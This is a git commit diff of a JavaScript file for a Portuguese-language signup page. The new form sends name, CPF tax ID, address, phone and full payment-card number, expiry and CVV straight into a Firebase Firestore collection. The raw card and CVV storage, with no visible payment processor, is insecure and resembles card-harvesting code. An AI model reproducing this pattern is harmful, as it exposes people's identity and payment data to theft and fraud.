ef4a7e5cb78694a6e5190d9e3cef34ce134e5460
Victor5879 <businessvitor00@gmail.com>
2024-05-16 11:47:12 -0300

    Add files via upload

--- script.js
+++ script.js
@@ -11,28 +11,58 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-document.getElementById('contact-form').addEventListener('submit', function(event) {
-    event.preventDefault();
-    alert('Mensagem enviada com sucesso!');
+document.getElementById('solicitarAgora').addEventListener('click', function() {
+    document.getElementById('register').scrollIntoView({ behavior: 'smooth' });
 });
+
+let currentStep = 0;
+const formSteps = document.querySelectorAll('.form-step');
+
+function nextStep() {
+    formSteps[currentStep].style.display = 'none';
+    currentStep = (currentStep + 1) % formSteps.length;
+    formSteps[currentStep].style.display = 'block';
+}
+
+function prevStep() {
+    formSteps[currentStep].style.display = 'none';
+    currentStep = (currentStep - 1 + formSteps.length) % formSteps.length;
+    formSteps[currentStep].style.display = 'block';
+}
 
 document.getElementById('register-form').addEventListener('submit', function(event) {
     event.preventDefault();
 
     const nome = document.getElementById('nome').value;
-    const cpf = document.getElementById('cpf').value;
-    const rg = document.getElementById('rg').value;
-    const dataNascimento = document.getElementById('dataNascimento').value;
     const email = document.getElementById('email').value;
+    const dataNascimento = document.getElementById('dataNascimento').value;
+    const cpf = document.getElementById('cpf').value;
+    const genero = document.getElementById('genero').value;
+    const celular = document.getElementById('celular').value;
+    const escolaridade = document.getElementById('escolaridade').value;
     const endereco = document.getElementById('endereco').value;
+    const cidade = document.getElementById('cidade').value;
+    const estado = document.getElementById('estado').value;
+    const cep = document.getElementById('cep').value;
+    const cartaoNumero = document.getElementById('cartaoNumero').value;
+    const cartaoValidade = document.getElementById('cartaoValidade').value;
+    const cartaoCVV = document.getElementById('cartaoCVV').value;
 
     db.collection('users').add({
         nome,
-        cpf,
-        rg,
-        dataNascimento,
         email,
-        endereco
+        dataNascimento,
+        cpf,
+        genero,
+        celular,
+        escolaridade,
+        endereco,
+        cidade,
+        estado,
+        cep,
+        cartaoNumero,
+        cartaoValidade,
+        cartaoCVV
     })
     .then(() => {
         alert('Usuário registrado com sucesso!');
